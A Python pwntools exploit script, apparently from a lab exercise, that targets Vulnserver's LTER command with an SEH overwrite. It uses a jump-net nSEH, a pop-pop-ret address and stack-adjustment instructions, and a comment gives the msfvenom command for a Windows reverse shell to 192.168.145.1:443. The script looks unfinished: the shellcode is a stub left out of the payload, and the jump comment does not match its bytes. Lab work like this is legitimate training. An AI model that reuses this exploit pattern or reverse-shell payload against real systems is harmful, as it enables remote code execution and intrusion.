#!/usr/bin/python3

# ============================================
# Vulnserver LTER exploit via SEH
# ============================================

from pwn import *

# === Target info ===
host = "192.168.145.129"
port = 9999
s = remote(host, port)

# === Initial Variables ===
vulncmd = b"LTER /.:/"  # this should cause the crash
crash = 4000  # a payload of this size triggers the crash
offset = 3515
junk = b"A" * offset

cyclic_pattern = cyclic_metasploit(4000)

# === SEH ===
# Jump Net techique(JZ 0x6, JNZ 0x4). This will bypass ascii restrictions as well
nseh = b"\x74\x10\x75\x08"
seh = p32(0x6250160a)  # pop pop ret - find with !mona seh

# ESP should point to A buffer after adjustment
adjstack = asm("and ebx, 0x554e4d4a; and ebx, 0x2a313235;") # zeroing ebx
adjstack += asm("pop ebx; add bx, 0x46d; push eax; pop esp")


# === Payload ===

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.145.1 LPORT=443 -b "\x00" -f hex EXINTFUNC=thread
shellcode = binascii.unhexlify("be3c4638")

payload = b"".join([
    vulncmd,
    junk,
    nseh,
    seh,
    b"\x47"*10, # add this in place of NOPs because the jump is funky
    adjstack  

])

payload += b"C" * (crash - len(payload))  # padding

s.send(payload)
s.close()
